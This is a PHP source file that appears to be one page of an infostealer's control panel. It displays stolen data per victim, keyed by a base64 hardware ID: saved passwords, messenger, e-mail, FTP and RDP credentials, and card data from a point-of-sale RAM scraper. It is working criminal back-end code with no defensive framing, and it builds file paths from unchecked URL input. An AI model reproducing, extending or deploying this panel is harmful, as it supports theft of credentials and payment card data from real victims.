<?php
error_reporting(0);
session_start();
require_once('session.php');
require_once('config.php');
$hwid = base64_decode($_GET['id']);

if (isset($_GET['id']))
  {
   
   echo '<link rel="stylesheet" type="text/css" href="../css/log.css"/>
   <link rel="stylesheet" type="text/css" href="../css/sbody.css"/>';

    if (file_exists('../'.$folder.'/pass/PW-'.$hwid.'.LOG'))
     {
       echo '<h2><img src="../img/passwords.png" height="48" width="48">&nbsp;Stored Passwords</b></h2>
             <textarea rows="15" name="Host" cols="300" style="width:100%; text-align:left;">'.str_replace("\n", "", file_get_contents('../'.$folder.'/pass/PW-'.$hwid.'.LOG')).'</textarea><hr>';
     }
     
     if (file_exists('../'.$folder.'/ins/INS-'.$hwid.'.Log'))
     {
       echo '<h2><img src="../img/messaging.png" height="48" width="48">&nbsp;Messengers Accounts</b></h2>
             <textarea rows="15" name="Host" cols="300" style="width:100%; text-align:left;">'.str_replace("\n", "", file_get_contents('../'.$folder.'/ins/INS-'.$hwid.'.Log')).'</textarea><hr>';
     }

     if (file_exists('../'.$folder.'/dump/POS-'.$hwid.'.log'))
     {
       echo '<h2><img src="../img/card.png" height="48" width="48">&nbsp;RAM Scraper</b></h2>
             <textarea rows="15" name="Host" cols="300" style="width:100%; text-align:left;">'.str_replace("\n", "", file_get_contents('../'.$folder.'/dump/POS-'.$hwid.'.log')).'</textarea><hr>';
     }
     
     if (file_exists('../'.$folder.'/mail/MAIL-'.$hwid.'.TxT'))
     {
       echo '<h2><img src="../img/mail.png" height="48" width="48">&nbsp;E-mails Accounts</b></h2>
             <textarea rows="15" name="Host" cols="300" style="width:100%; text-align:left;">'.str_replace("\n", "", file_get_contents('../'.$folder.'/mail/MAIL-'.$hwid.'.TxT')).'</textarea><hr>';
     }
     
     if (file_exists('../'.$folder.'/ftp/FTP-'.$hwid.'.txt'))
     {
       echo '<h2><img src="../img/ftp.png" height="48" width="48">&nbsp;FTP Accounts</b></h2>
             <textarea rows="15" name="Host" cols="300" style="width:100%; text-align:left;">'.str_replace("\n", "", file_get_contents('../'.$folder.'/ftp/FTP-'.$hwid.'.txt')).'</textarea><hr>';
     }

     if (file_exists('../'.$folder.'/rdp/RDP-'.$hwid.'.TXT'))
     {
       echo '<h2><img src="../img/rdp.png" height="48" width="48">&nbsp;RDP Accounts</b></h2>
             <textarea rows="15" name="Host" cols="300" style="width:100%; text-align:left;">'.str_replace("\n", "", file_get_contents('../'.$folder.'/rdp/RDP-'.$hwid.'.TXT')).'</textarea><hr>';
     }
  }
  
?>